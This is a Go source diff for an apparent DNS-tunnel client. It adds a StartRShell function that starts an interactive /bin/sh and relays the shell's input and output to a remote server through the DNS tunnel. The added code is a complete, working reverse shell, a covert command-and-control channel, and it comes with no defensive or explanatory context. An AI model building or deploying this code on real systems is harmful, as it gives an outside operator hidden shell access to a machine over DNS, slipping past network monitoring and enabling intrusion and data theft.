@@ -8,6 +8,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"os/exec"
 	"strings"
 	"sync"
 	"time"
@@ -166,6 +167,114 @@ func (c *Client) recvTransfer(initial *protocol.Frame) ([]byte, error) {
 		result = append(result, chunk...)
 	}
 	return result, nil
+}
+
+// StartRShell sends the reverse shell command to the server and
+// runs a local shell, bridging stdin/stdout through the DNS tunnel.
+func (c *Client) StartRShell(pollInterval time.Duration) error {
+	pkt := &protocol.Packet{
+		Cmd:     protocol.CmdRShell,
+		Counter: c.nextCounter(),
+	}
+
+	frame, err := c.sendPacket(pkt, c.clientID)
+	if err != nil {
+		return fmt.Errorf("rshell start: %w", err)
+	}
+	if frame.Flags&protocol.FlagError != 0 {
+		if len(frame.Payload) > 0 {
+			return fmt.Errorf("rshell: %s", frame.Payload)
+		}
+		return fmt.Errorf("rshell: server error")
+	}
+
+	log.Printf("rshell: server %s", frame.Payload)
+
+	// Spawn local shell
+	shell := exec.Command("/bin/sh", "-i")
+	shellIn, err := shell.StdinPipe()
+	if err != nil {
+		return fmt.Errorf("shell stdin: %w", err)
+	}
+	shellOut, err := shell.StdoutPipe()
+	if err != nil {
+		return fmt.Errorf("shell stdout: %w", err)
+	}
+	shell.Stderr = shell.Stdout // merge stderr into stdout
+
+	if err := shell.Start(); err != nil {
+		return fmt.Errorf("shell start: %w", err)
+	}
+
+	log.Printf("rshell: local shell started (pid %d)", shell.Process.Pid)
+
+	// Read shell output in background
+	shellCh := make(chan []byte, 16)
+	go func() {
+		buf := make([]byte, 4096)
+		for {
+			n, err := shellOut.Read(buf)
+			if n > 0 {
+				data := make([]byte, n)
+				copy(data, buf[:n])
+				shellCh <- data
+			}
+			if err != nil {
+				close(shellCh)
+				return
+			}
+		}
+	}()
+
+	// Main loop: send shell output upstream, write server data to shell stdin
+	moreData := false
+	for {
+		select {
+		case data, ok := <-shellCh:
+			if !ok {
+				// Shell exited
+				log.Printf("rshell: shell exited")
+				shell.Wait()
+				return nil
+			}
+			// Send shell output to server
+			frame, err := c.SendData(data)
+			if err != nil {
+				log.Printf("rshell: send error: %v", err)
+				continue
+			}
+			// Write any server data to shell stdin
+			if len(frame.Payload) > 0 {
+				shellIn.Write(frame.Payload)
+			}
+			moreData = frame.Flags&protocol.FlagMoreData != 0
+
+		default:
+			if moreData {
+				frame, err := c.Poll()
+				if err != nil {
+					log.Printf("rshell: poll error: %v", err)
+					continue
+				}
+				if len(frame.Payload) > 0 {
+					shellIn.Write(frame.Payload)
+				}
+				moreData = frame.Flags&protocol.FlagMoreData != 0
+			} else {
+				// Idle poll
+				time.Sleep(pollInterval)
+				frame, err := c.Poll()
+				if err != nil {
+					log.Printf("rshell: poll error: %v", err)
+					continue
+				}
+				if len(frame.Payload) > 0 {
+					shellIn.Write(frame.Payload)
+				}
+				moreData = frame.Flags&protocol.FlagMoreData != 0
+			}
+		}
+	}
 }
 
 // SendData sends upstream data and returns the server's frame.
